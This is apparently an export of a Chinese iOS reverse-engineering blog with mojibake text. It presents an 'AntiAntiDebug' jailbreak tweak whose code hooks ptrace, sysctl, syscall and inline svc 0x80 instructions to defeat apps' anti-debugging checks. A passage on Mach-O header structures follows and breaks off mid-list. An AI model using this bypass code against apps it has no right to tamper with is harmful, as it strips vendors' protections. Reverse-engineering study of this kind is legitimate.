<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><h3 id="åè°ƒè¯•ç›¸å…³æŠ€æœ¯å‚è€ƒ"><a href="#åè°ƒè¯•ç›¸å…³æŠ€æœ¯å‚è€ƒ" class="headerlink" title="åè°ƒè¯•ç›¸å…³æŠ€æœ¯å‚è€ƒ"></a>åè°ƒè¯•ç›¸å…³æŠ€æœ¯å‚è€ƒ</h3><p><a href="http://bbs.iosre.com/t/topic/9351" target="_blank" rel="external">åè°ƒè¯•ä¸ç»•è¿‡çš„å¥‡æ·«æŠ€å·§</a><br><a href="http://bbs.iosre.com/t/topic/8179" target="_blank" rel="external">å…³äºåè°ƒè¯•&amp;ååè°ƒè¯•é‚£äº›äº‹</a></p>
<h3 id="ç›¸å…³çŸ¥è¯†å‚¨å¤‡"><a href="#ç›¸å…³çŸ¥è¯†å‚¨å¤‡" class="headerlink" title="ç›¸å…³çŸ¥è¯†å‚¨å¤‡"></a>ç›¸å…³çŸ¥è¯†å‚¨å¤‡</h3><blockquote>
<p><a href="https://yunnigu.dropsec.xyz/2020/12/10/MachO%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/#more">MochOæ–‡ä»¶ç»“æ„</a></p>
<p><a href="https://yunnigu.dropsec.xyz/2020/12/30/dyld%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/#more">dyldé“¾æ¥åŠ è½½æµç¨‹</a></p>
<p>iOS inline Hook</p>
<p>Preferenceloaderï¼Œapplistæ¨¡å—é›†æˆ</p>
</blockquote>
<p>ä¹‹å‰å¯¹åè°ƒè¯•çš„ç»•è¿‡ä¸€èˆ¬éƒ½æ˜¯é‡‡ç”¨é’ˆå¯¹å¯¹åº”APPç¼–å†™Hookæ’ä»¶æ¥ç»•è¿‡åè°ƒè¯•ï¼Œæˆ–è€…æ˜¯å¯åŠ¨è°ƒè¯•å®šä½åè°ƒè¯•ç‚¹ï¼Œä¿®æ”¹å¯„å­˜å™¨nopæ±‡ç¼–æŒ‡ä»¤è¿›è¡Œç»•è¿‡ï¼Œ<br>å‰å‡ å¤©åœ¨ä½¿ç”¨RevealLoaderçš„è¿‡ç¨‹ä¸­ï¼Œçœ‹åˆ°å…¶ä¸‹å›¾ç•Œé¢ï¼Œçªå‘å¥‡æƒ³æ˜¯å¦å¯ä»¥å¼€å‘ä¸€ä¸ªé€šç”¨çš„æ’ä»¶ï¼Œé€‰ä¸­æŸä¸ªAPPå³å¯ç»•è¿‡å…¶åè°ƒè¯•ï¼Œä¸å†éœ€è¦é€ä¸ªåˆ†æAPPçš„åè°ƒè¯•çš„åè°ƒè¯•ç‚¹ï¼Œäºæ˜¯é€šè¿‡ä¹‹å‰å¯¹åè°ƒè¯•çš„ä¸€äº›ç§¯ç´¯é›†æˆäº†æœ¬å·¥å…·ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/AntiAntiDebug1.png" alt=""></p>
<h2 id="é›†æˆAppList-å’Œ-PreferenceLoader"><a href="#é›†æˆAppList-å’Œ-PreferenceLoader" class="headerlink" title="é›†æˆAppList å’Œ PreferenceLoader"></a>é›†æˆAppList å’Œ PreferenceLoader</h2><p>é€šè¿‡é˜…è¯»<a href="https://github.com/heardrwt/RevealLoader" target="_blank" rel="external">RevealLoader</a>æºç ï¼Œå‘ç°æƒ³è¦å®ç°åœ¨è®¾ç½®ä¸­æ·»åŠ æ¯ä¸ªAPPçš„å¼€å…³é€‰é¡¹ï¼Œéœ€è¦ä¾èµ–PreferenceLoaderå’ŒAppListä¸¤ä¸ªæ¨¡å—ã€‚</p>
<p>PreferenceLoader æ˜¯ä¸€ä¸ª MobileSubstrate æä¾›çš„æ¨¡å—ï¼Œå®ƒå¯ä»¥è®©å¼€å‘è€…åœ¨ç³»ç»Ÿè®¾ç½®ç•Œé¢æ·»åŠ åº”ç”¨ç¨‹åºå…¥å£ã€‚ AppList æ˜¯ä¸€ä¸ªè®©å¼€å‘è€…è·å–ç³»ç»Ÿä¸­å·²å®‰è£…åº”ç”¨ä¿¡æ¯çš„åº“ã€‚è¿™ä¸¤ä¸ªæ¨¡å—ç›¸ç»“åˆå³å¯å®ç°RevealLoaderä¸­å‘ˆç°çš„æ•ˆæœã€‚</p>
<p>æ’ä»¶å¼€å‘ä½¿ç”¨MonKeyDevï¼Œæ–°å»ºLogos Tweaké¡¹ç›®ï¼Œåœ¨/Package/Libraryç›®å½•ä¸‹æ–°å»ºPreferenceLoader/Preferencesæ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹ä¸­å­˜æ”¾ProjectName.plisté…ç½®æ–‡ä»¶ä»¥åŠæ’ä»¶æ‰€éœ€å›¾æ ‡å›¾ç‰‡æ–‡ä»¶ã€‚<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/AntiAntiDebug2.png" alt=""><br>ä¸‹å›¾ä¸ºProjectName.plistæ–‡ä»¶çš„è¯¦ç»†å†…å®¹ï¼Œ ALSettingsPathæŒ‡å®šæ’ä»¶è®¾ç½®å¯¹åº”çš„å­˜å‚¨è·¯å¾„ï¼ŒALSettingsKeyPrefixåˆ™æ˜¯æ¯ä¸ªåº”ç”¨é…ç½®çš„å‰ç¼€ã€‚<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/AntiAntiDebug3.png" alt=""></p>
<h2 id="Tweakç¼–å†™"><a href="#Tweakç¼–å†™" class="headerlink" title="Tweakç¼–å†™"></a>Tweakç¼–å†™</h2><p>ä»£ç ä¸­é¦–å…ˆéœ€è¦è¯»å–å‰é¢plistæ–‡ä»¶ä¸­ä¿å­˜çš„é…ç½®ä¿¡æ¯ï¼Œé€šè¿‡å‰ç¼€è¿æ¥APPçš„bundleidæ¥åˆ¤æ–­å¯¹åº”APPæ˜¯å¦åœ¨è®¾ç½®ä¸­æ‰“å¼€å¼€å…³ï¼Œå¦‚æœæ‰“å¼€ï¼Œå°±è¿›è¡Œä¸‹é¢çš„AntiDebug_Hookæ¥ç»•è¿‡åè°ƒè¯•ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">NSDictionary *pref = [NSDictionary dictionaryWithContentsOfFile:@<span class="string">"/var/mobile/Library/Preferences/com.yunnigu.AntiAntiDebug.plist"</span>];</div><div class="line">    NSString *keyPath = [NSString stringWithFormat:@<span class="string">"AntiAntiDebugEnabled-%@"</span>, [[NSBundle mainBundle] bundleIdentifier]];</div><div class="line">    <span class="keyword">if</span> ([[pref objectForKey:keyPath] boolValue]) &#123;</div><div class="line">        NSLog(@<span class="string">"-------AntiAntiDebugğŸ²ğŸ²ğŸ²----------StartğŸ¯ğŸ¯ğŸ¯-------------"</span>);</div><div class="line">        <span class="comment">//ptrace</span></div><div class="line">        MSHookFunction((<span class="keyword">void</span> *)MSFindSymbol(<span class="literal">NULL</span>,<span class="string">"_ptrace"</span>),(<span class="keyword">void</span>*)my_ptrace,(<span class="keyword">void</span>**)&amp;orig_ptrace);</div><div class="line">        <span class="comment">//dlsym</span></div><div class="line">        MSHookFunction((<span class="keyword">void</span> *)dlsym,(<span class="keyword">void</span>*)my_dlsym,(<span class="keyword">void</span>**)&amp;orig_dlsym);</div><div class="line">        <span class="comment">//sysctl</span></div><div class="line">        MSHookFunction((<span class="keyword">void</span> *)sysctl,(<span class="keyword">void</span>*)my_sysctl,(<span class="keyword">void</span>**)&amp;orig_sysctl);</div><div class="line">        <span class="comment">//syscall</span></div><div class="line">        MSHookFunction((<span class="keyword">void</span> *)syscall,(<span class="keyword">void</span>*)my_syscall,(<span class="keyword">void</span>**)&amp;orig_syscall);</div><div class="line">        <span class="comment">//svc 0x80</span></div><div class="line">        hook_svc_x80();</div><div class="line">        NSLog(@<span class="string">"[AntiAntiDebug] Module loaded!!!"</span>);</div><div class="line">        NSLog(@<span class="string">"-------AntiAntiDebugğŸ²ğŸ²ğŸ²----------EndğŸ¯ğŸ¯ğŸ¯-------------"</span>);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>åè°ƒè¯•åŠå…¶ç»•è¿‡çš„ç›¸å…³çŸ¥è¯†æˆ‘åœ¨<a href="https://yunnigu.dropsec.xyz/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/">åŠ¨æ€ç»•è¿‡iOSå†…è”svcåè°ƒè¯•</a>ä¸­å·²ç»æœ‰è¿‡åˆ†äº«ï¼Œæœ¬ç¯‡ä¸»è¦è¯¦ç»†åˆ†æä¸€ä¸‹å¯¹svc 0x80è¿›è¡ŒHookçš„æµç¨‹ã€‚</p>
<h3 id="svc-0x80-Hook"><a href="#svc-0x80-Hook" class="headerlink" title="svc 0x80 Hook"></a>svc 0x80 Hook</h3><p>è¿™ç§æ–¹å¼ä¸»è¦æ˜¯é€šè¿‡å†…åµŒæ±‡ç¼–çš„æ–¹å¼å¯¹ptraceç­‰åè°ƒè¯•å‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œä¹‹å‰å¯¹å…¶ç»•è¿‡çš„å¤„ç†æ–¹å¼ä¸€èˆ¬éƒ½æ˜¯è®²è¯¥æ®µæ±‡ç¼–ä»£ç ä»¥NOPè¿›è¡Œä»£æ›¿ï¼Œè¿™ç§æ–¹å¼åœ¨å®šä½åˆ°åè°ƒè¯•è°ƒç”¨åœ°å€çš„å‰æä¸‹å¾ˆå¥½ç”¨ï¼Œåœ¨æœ¬å·¥å…·ä¸­ç”±äºæ— æ³•å®šä½åè°ƒè¯•åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½åœ¨textæ®µä¸­æœç´¢svc 0x80æŒ‡ä»¤ï¼ŒAPPæœ‰æ—¶åœ¨æ­£å¸¸é€»è¾‘ä¸­åŒæ ·ä½¿ç”¨svc 0x80è¿›è¡Œè°ƒç”¨ï¼Œå¦‚æœç»Ÿä¸€NOPå¯èƒ½ä¼šé€ æˆå´©æºƒçš„æƒ…å†µå‡ºç°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨æ‰¾åˆ°svc 0x80æŒ‡ä»¤ä¹‹åï¼Œå¯¹å…¶è¿›è¡ŒHookåˆ¤æ–­å…¶ä¼ å‚ï¼Œå¯¹åè°ƒè¯•åšå‡ºåº”å¯¹ã€‚</p>
<p>ä»¥ä¸‹æ˜¯hook_svc0x80çš„è¯¦ç»†ä»£ç ï¼Œä»£ç HookåŸºäº<a href="https://github.com/jmpews/Dobby" target="_blank" rel="external">Hookzzç›®å‰å‡çº§ä¸ºDobby</a>æ¡†æ¶ï¼Œä»¥ä»£ç æ³¨é‡Šè¿›è¡Œè¯´æ˜ï¼Œæƒ³è¦æ·±å…¥ç†è§£svc 0x80æŒ‡ä»¤è·å–æµç¨‹ï¼Œéœ€è¦å¯¹MachOç»“æ„æœ‰ä¸€å®šäº†è§£ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">hook_svc_x80</span><span class="params">()</span> </span>&#123;</div><div class="line">    zaddr svc_x80_addr;</div><div class="line">    zaddr curr_addr, text_start_addr, text_end_addr;</div><div class="line">    <span class="keyword">uint32_t</span> svc_x80_byte = <span class="number">0xd4001001</span>;</div><div class="line">    <span class="comment">//é¦–å…ˆé€šè¿‡dyldä¸­çš„_dyld_get_image_headerè·å–ä¸»ç¨‹åºçš„macho_header</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header = <span class="number">_</span>dyld_get_image_header(<span class="number">0</span>);</div><div class="line">    <span class="comment">//è·å–__TEXT segmentç»“æ„ä½“</span></div><div class="line">    <span class="keyword">struct</span> segment_command_64 *seg_cmd_64 = zz_macho_get_segment_64_via_name((<span class="keyword">struct</span> mach_header_64 *)header, (<span class="keyword">char</span> *)<span class="string">"__TEXT"</span>);</div><div class="line">    <span class="comment">//è®¡ç®—Machoå†…å­˜ä¸­åŸºåœ°å€åˆ°__TEXTåç§»</span></div><div class="line">    zsize slide = (zaddr)header - (zaddr)seg_cmd_64-&gt;vmaddr;</div><div class="line">    <span class="comment">//è·å–__text sectionç»“æ„ä½“</span></div><div class="line">    <span class="keyword">struct</span> section_64 *sect_64 = zz_macho_get_section_64_via_name((<span class="keyword">struct</span> mach_header_64 *)header, (<span class="keyword">char</span> *)<span class="string">"__text"</span>);</div><div class="line">    <span class="comment">//è®¡ç®—å‡º__textå®é™…åœ°å€</span></div><div class="line">    text_start_addr = slide + (zaddr)sect_64-&gt;addr;</div><div class="line">    text_end_addr = text_start_addr + sect_64-&gt;size;</div><div class="line">    curr_addr = text_start_addr;</div><div class="line">    <span class="comment">//å¾ªç¯æŸ¥æ‰¾svc 0x80æŒ‡ä»¤ï¼Œè¿›è¡ŒHookæ“ä½œ</span></div><div class="line">    <span class="keyword">while</span> (curr_addr &lt; text_end_addr) &#123;</div><div class="line">        svc_x80_addr = (zaddr)zz_vm_search_data((zpointer)curr_addr, (zpointer)text_end_addr, (zbyte *)&amp;svc_x80_byte, <span class="number">4</span>);</div><div class="line">        <span class="keyword">if</span> (svc_x80_addr) &#123;</div><div class="line">            NSLog(@<span class="string">"hook svc #0x80 at %p with aslr (%p without aslr)"</span>,</div><div class="line">                  (<span class="keyword">void</span> *)svc_x80_addr, (<span class="keyword">void</span> *)(svc_x80_addr - slide));</div><div class="line">            ZzBuildHookAddress((<span class="keyword">void</span> *)svc_x80_addr, (<span class="keyword">void</span> *)(svc_x80_addr + <span class="number">4</span>),</div><div class="line">                               hook_svc_pre_call, hook_svc_half_call, TRUE);</div><div class="line">            ZzEnableHook((<span class="keyword">void</span> *)svc_x80_addr);</div><div class="line">            curr_addr = svc_x80_addr + <span class="number">4</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">struct</span> section_64 *</span></div><div class="line"><span class="title">zz_macho_get_section_64_via_name</span><span class="params">(<span class="keyword">struct</span> mach_header_64 *header,</span></div><div class="line">                                 <span class="keyword">char</span> *sect_name) &#123;</div><div class="line">    <span class="keyword">struct</span> load_command *load_cmd;</div><div class="line">    <span class="keyword">struct</span> segment_command_64 *seg_cmd_64;</div><div class="line">    <span class="keyword">struct</span> section_64 *sect_64;</div><div class="line">    load_cmd = (<span class="keyword">struct</span> load_command *)((zaddr)header + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mach_header_64));</div><div class="line">    <span class="keyword">for</span> (zsize i = <span class="number">0</span>; i &lt; header-&gt;ncmds;</div><div class="line">         i++, load_cmd = (<span class="keyword">struct</span> load_command *)((zaddr)load_cmd + load_cmd-&gt;cmdsize)) &#123;</div><div class="line">        <span class="keyword">if</span> (load_cmd-&gt;cmd == LC_SEGMENT_64) &#123;</div><div class="line">            seg_cmd_64 = (<span class="keyword">struct</span> segment_command_64 *)load_cmd;</div><div class="line">            sect_64 = (<span class="keyword">struct</span> section_64 *)((zaddr)seg_cmd_64 + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> segment_command_64));</div><div class="line">           <span class="comment">//åœ¨__TEXTä¸­å¾ªç¯æŸ¥æ‰¾sectionï¼Œè¿”å›__text section</span></div><div class="line">            <span class="keyword">for</span> (zsize j = <span class="number">0</span>; j &lt; seg_cmd_64-&gt;nsects;</div><div class="line">                 j++, sect_64 = (<span class="keyword">struct</span> section_64 *)((zaddr)sect_64 + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> section_64))) &#123;</div><div class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sect_64-&gt;sectname, sect_name)) &#123;</div><div class="line">                    <span class="keyword">return</span> sect_64;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">zpointer <span class="title">zz_vm_search_data</span><span class="params">(<span class="keyword">const</span> zpointer start_addr, zpointer end_addr, zbyte *data,</span></span></div><div class="line">                           zsize data_len)</div><div class="line">&#123;</div><div class="line">    zpointer curr_addr;</div><div class="line">    <span class="keyword">if</span> (start_addr &lt;= (zpointer)<span class="number">0</span>)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"search address start_addr(%p) &lt; 0"</span>, (zpointer)start_addr);</div><div class="line">    <span class="keyword">if</span> (start_addr &gt; end_addr)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"search start_add(%p) &lt; end_addr(%p)"</span>, (zpointer)start_addr, (zpointer)end_addr);</div><div class="line">    </div><div class="line">    curr_addr = start_addr;</div><div class="line">    </div><div class="line">    <span class="keyword">while</span> (end_addr &gt; curr_addr)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(curr_addr, data, data_len))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">return</span> curr_addr;</div><div class="line">        &#125;</div><div class="line">        curr_addr = (zpointer)((zaddr)curr_addr + data_len);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">struct</span> segment_command_64 *</span></div><div class="line"><span class="title">zz_macho_get_segment_64_via_name</span><span class="params">(<span class="keyword">struct</span> mach_header_64 *header,</span></div><div class="line">                                 <span class="keyword">char</span> *segment_name) &#123;</div><div class="line">    <span class="keyword">struct</span> load_command *load_cmd;</div><div class="line">    <span class="keyword">struct</span> segment_command_64 *seg_cmd_64;</div><div class="line">    <span class="keyword">struct</span> section_64 *sect_64;</div><div class="line">    <span class="comment">//ç¡®å®šload_cmdåœ°å€</span></div><div class="line">    load_cmd = (<span class="keyword">struct</span> load_command *)((zaddr)header + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mach_header_64));</div><div class="line">    <span class="comment">//å¾ªç¯load_cmdä¸­çš„segmentï¼Œè¿”å›__TEXT segment</span></div><div class="line">    <span class="keyword">for</span> (zsize i = <span class="number">0</span>; i &lt; header-&gt;ncmds;</div><div class="line">         i++, load_cmd = (<span class="keyword">struct</span> load_command *)((zaddr)load_cmd + load_cmd-&gt;cmdsize)) &#123;</div><div class="line">        <span class="keyword">if</span> (load_cmd-&gt;cmd == LC_SEGMENT_64) &#123;</div><div class="line">            seg_cmd_64 = (<span class="keyword">struct</span> segment_command_64 *)load_cmd;</div><div class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(seg_cmd_64-&gt;segname, segment_name)) &#123;</div><div class="line">                <span class="keyword">return</span> seg_cmd_64;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">hook_svc_pre_call</span><span class="params">(RegState *rs, ThreadStack *threadstack, CallStack *callstack)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> num_syscall;</div><div class="line">    <span class="keyword">int</span> request;</div><div class="line">    num_syscall = (<span class="keyword">int</span>)(<span class="keyword">uint64_t</span>)(rs-&gt;general.regs.x16);</div><div class="line">    request = (<span class="keyword">int</span>)(<span class="keyword">uint64_t</span>)(rs-&gt;general.regs.x0);</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (num_syscall == SYS_syscall) &#123;</div><div class="line">        <span class="keyword">int</span> arg1 = (<span class="keyword">int</span>)(<span class="keyword">uint64_t</span>)(rs-&gt;general.regs.x1);</div><div class="line">        <span class="keyword">if</span> (request == SYS_ptrace &amp;&amp; arg1 == PT_DENY_ATTACH) &#123;</div><div class="line">            *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;rs-&gt;general.regs.x1) = <span class="number">0</span>;</div><div class="line">            NSLog(@<span class="string">"[AntiDebugBypass] catch 'SVC #0x80; syscall(ptrace)' and bypass"</span>);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num_syscall == SYS_ptrace) &#123;</div><div class="line">        request = (<span class="keyword">int</span>)(<span class="keyword">uint64_t</span>)(rs-&gt;general.regs.x0);</div><div class="line">        <span class="keyword">if</span> (request == PT_DENY_ATTACH) &#123;</div><div class="line">            *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;rs-&gt;general.regs.x0) = <span class="number">0</span>;</div><div class="line">            NSLog(@<span class="string">"[AntiDebugBypass] catch 'SVC-0x80; ptrace' and bypass"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(num_syscall == SYS_sysctl) &#123;</div><div class="line">        STACK_SET(callstack, (<span class="keyword">char</span> *)<span class="string">"num_syscall"</span>, num_syscall, <span class="keyword">int</span>);</div><div class="line">        STACK_SET(callstack, (<span class="keyword">char</span> *)<span class="string">"info_ptr"</span>, rs-&gt;general.regs.x2, zpointer);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">hook_svc_half_call</span><span class="params">(RegState *rs, ThreadStack *threadstack, CallStack *callstack)</span> </span>&#123;</div><div class="line">    </div><div class="line">    <span class="keyword">if</span>(STACK_CHECK_KEY(callstack, (<span class="keyword">char</span> *)<span class="string">"num_syscall"</span>)) &#123;</div><div class="line">        <span class="keyword">int</span> num_syscall = STACK_GET(callstack, (<span class="keyword">char</span> *)<span class="string">"num_syscall"</span>, <span class="keyword">int</span>);</div><div class="line">        <span class="keyword">struct</span> kinfo_proc *info = STACK_GET(callstack, (<span class="keyword">char</span> *)<span class="string">"info_ptr"</span>, <span class="keyword">struct</span> kinfo_proc *);</div><div class="line">        <span class="keyword">if</span> (num_syscall == SYS_sysctl)</div><div class="line">        &#123;</div><div class="line">            NSLog(@<span class="string">"[AntiDebugBypass] catch 'SVC-0x80; sysctl' and bypass"</span>);</div><div class="line">            info-&gt;kp_proc.p_flag &amp;= ~(P_TRACED);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç›®å‰æµ‹è¯•å¤šæ¬¾APPå‡ç»•è¿‡å…¶åè°ƒè¯•æ£€æµ‹ï¼Œå„ä½çœ‹å®˜åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å¦‚é‡åˆ°æ— æ³•ç»•è¿‡çš„æƒ…å†µï¼Œè¯·åœ¨è¯„è®ºåŒºç•™è¨€ï¼Œå…ˆæå‰æ„Ÿè°¢å¤§å®¶å¸®æˆ‘å®Œå–„å·¥å…·ã€‚</p>
<p>é¡¹ç›®çš„githubåœ°å€ï¼š<a href="https://github.com/yunnigu/AntiAntiDebug" target="_blank" rel="external">https://github.com/yunnigu/AntiAntiDebug</a></p>
<blockquote>
<p>æœ¬æ–‡ä»…ç”¨æ¥å­¦ä¹ äº¤æµï¼Œè¿æ³•çŠ¯ç½ªç¦æ­¢ä½¿ç”¨ï¼Œå¦åˆ™åæœè‡ªä»˜ï¼å¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»ä½œè€…åˆ é™¤ï¼Œæœ¬é¡¹ç›®å…·ä½“ä½¿ç”¨æŒ‡å—è¯·å‚ç…§ç½‘ç»œå®‰å…¨æ³•</p>
</blockquote>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>MachO</tag>
        <tag>Tweak</tag>
      </tags>
  </entry>
  <entry>
    <title>MachOæ–‡ä»¶ç»“æ„</title>
    <url>/2020/12/10/MachO%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>æ¥è§¦iOSé€†å‘å·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰å¥½å¥½å»äº†è§£ä¸€ä¸‹æœ€åŸºç¡€çš„MachOç»“æ„ï¼Œæœ¬æ–‡ä¸»è¦è®°å½•ä¸€ä¸‹å¯¹MachOæ–‡ä»¶ç»“æ„çš„å­¦ä¹ å’Œç†è§£ã€‚<br><a id="more"></a></p>
<h1 id="MachOæ–‡ä»¶çš„åŸºæœ¬æ ¼å¼"><a href="#MachOæ–‡ä»¶çš„åŸºæœ¬æ ¼å¼" class="headerlink" title="MachOæ–‡ä»¶çš„åŸºæœ¬æ ¼å¼"></a>MachOæ–‡ä»¶çš„åŸºæœ¬æ ¼å¼</h1><p>Mach-Oæ˜¯Mach Objectæ–‡ä»¶æ ¼å¼çš„ç¼©å†™ï¼ŒiOSä»¥åŠMacä¸Šå¯æ‰§è¡Œçš„æ–‡ä»¶æ ¼å¼ï¼Œç±»ä¼¼Windowçš„PEï¼ŒLinuxä¸Šçš„ELFã€‚<br>ç”±ä¸‹å›¾å¯çŸ¥ï¼ŒMachOæ–‡ä»¶çš„ç»“æ„ï¼Œä¸»è¦åŒ…æ‹¬Headerã€LoadCommandã€Dataä¸‰éƒ¨åˆ†ï¼ŒDataéƒ¨åˆ†ç”±Sectionç»„æˆã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/MachO1.jpg" alt=""></p>
<ul>
<li>Headerï¼šä¿å­˜äº†Mach-Oçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬äº†å¹³å°ã€æ–‡ä»¶ç±»å‹ã€LoadCommandsçš„ä¸ªæ•°ç­‰ç­‰ã€‚</li>
<li>LoadCommandsï¼šåŠ è½½Mach-Oæ–‡ä»¶æ—¶ä¼šä½¿ç”¨è¿™é‡Œçš„æ•°æ®æ¥ç¡®å®šå†…å­˜çš„åˆ†å¸ƒã€‚</li>
<li>Dataï¼šæ¯ä¸€ä¸ªsegmentçš„å…·ä½“æ•°æ®éƒ½ä¿å­˜åœ¨è¿™é‡Œï¼Œè¿™é‡ŒåŒ…å«äº†å…·ä½“çš„ä»£ç ã€æ•°æ®ç­‰ç­‰ã€‚</li>
</ul>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸ªåˆ†æMachOæ–‡ä»¶ç»“æ„çš„å¿…å¤‡å·¥å…·ï¼ŒMachOView</p>
<p>MachOViewä¸‹è½½åœ°å€ï¼š<a href="http://sourceforge.net/projects/machoview/" target="_blank" rel="external">http://sourceforge.net/projects/machoview/</a></p>
<p>MachOViewæºç åœ°å€ï¼š<a href="https://github.com/gdbinit/MachOView" target="_blank" rel="external">https://github.com/gdbinit/MachOView</a></p>
<p>æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/MachO2.jpg" alt=""></p>
<h1 id="MachOå¤´éƒ¨"><a href="#MachOå¤´éƒ¨" class="headerlink" title="MachOå¤´éƒ¨"></a>MachOå¤´éƒ¨</h1><p>MachOå¤´éƒ¨ç»“æ„å¯ä»¥ä»è‹¹æœå¼€æºçš„ä»£ç ä¸­æ‰¾åˆ°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * The 32-bit mach header appears at the very beginning of the object file for</div><div class="line"> * 32-bit architectures.</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> mach_header &#123;</div><div class="line">	<span class="keyword">uint32_t</span>	magic;		<span class="comment">/* mach magic number identifier */</span></div><div class="line">	<span class="keyword">cpu_type_t</span>	cputype;	<span class="comment">/* cpu specifier */</span></div><div class="line">	<span class="keyword">cpu_subtype_t</span>	cpusubtype;	<span class="comment">/* machine specifier */</span></div><div class="line">	<span class="keyword">uint32_t</span>	filetype;	<span class="comment">/* type of file */</span></div><div class="line">	<span class="keyword">uint32_t</span>	ncmds;		<span class="comment">/* number of load commands */</span></div><div class="line">	<span class="keyword">uint32_t</span>	sizeofcmds;	<span class="comment">/* the size of all the load commands */</span></div><div class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"> * The <span class="number">64</span>-bit mach header appears at the very beginning of object files <span class="keyword">for</span></div><div class="line"> * <span class="number">64</span>-bit architectures.</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> mach_header_64 &#123;</div><div class="line">	<span class="keyword">uint32_t</span>	magic;		<span class="comment">/* mach magic number identifier */</span></div><div class="line">	<span class="keyword">cpu_type_t</span>	cputype;	<span class="comment">/* cpu specifier */</span></div><div class="line">	<span class="keyword">cpu_subtype_t</span>	cpusubtype;	<span class="comment">/* machine specifier */</span></div><div class="line">	<span class="keyword">uint32_t</span>	filetype;	<span class="comment">/* type of file */</span></div><div class="line">	<span class="keyword">uint32_t</span>	ncmds;		<span class="comment">/* number of load commands */</span></div><div class="line">	<span class="keyword">uint32_t</span>	sizeofcmds;	<span class="comment">/* the size of all the load commands */</span></div><div class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></div><div class="line">	<span class="keyword">uint32_t</span>	reserved;	<span class="comment">/* reserved */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>ä»ä¸Šé¢çš„ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œå®ƒç”±ä»¥ä¸‹éƒ¨åˆ†ç»„æˆã€‚</p>
<ul>
